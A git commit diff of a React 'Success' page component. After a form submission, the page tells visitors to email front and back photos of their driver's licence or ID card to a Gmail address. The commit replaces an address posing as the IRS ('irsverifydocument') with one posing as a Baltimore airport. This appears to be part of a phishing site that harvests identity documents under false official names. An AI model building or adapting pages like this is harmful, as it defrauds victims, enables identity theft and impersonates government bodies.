ee208ce891831c32e2aee1ce50d087f8d11bd97b
Joezy12 <oyebodejoseph74@gmail.com>
2025-04-30 15:31:41 +0100

    inito

--- src/success.jsx
+++ src/success.jsx
@@ -6,8 +6,8 @@ function Success(prop) {
             <div className="box">
                 <img src="https://static.vecteezy.com/system/resources/thumbnails/001/622/545/original/success-check-mark-icon-animation-video.jpg" alt="" />
                 <h1>Your Information Has been Submited Successfully</h1>
-                <p>please provide back and front photograph of your valid driver's lincense/I.D card to<br />
-                irsverifydocument@gmail.com</p>
+                <p>please provide back and front photograph of your valid driver's lincense/I.D card to<br />baltimoreairports@gmail.com
+            </p>
             </div>
         </div>
     )
